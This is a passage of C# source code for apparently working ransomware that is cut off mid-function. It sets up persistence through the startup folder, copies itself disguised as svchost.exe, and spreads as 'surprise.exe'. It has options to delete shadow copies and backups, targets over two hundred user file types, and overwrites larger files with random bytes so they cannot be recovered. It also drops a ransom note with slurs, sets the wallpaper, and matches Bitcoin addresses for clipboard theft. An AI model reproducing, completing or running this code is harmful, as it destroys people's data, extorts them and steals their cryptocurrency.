using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = false;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[1] { "hi i am a lazy cyber criminal who cant program so im gonna steal your crypto oh you dont have crypto well uhhhhhh im gonna encrypt your files then you stupid bitch hahah and then im gonna make a bit of money cause i am indian so i need money in cryptocurrency and im lazy to get a job" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
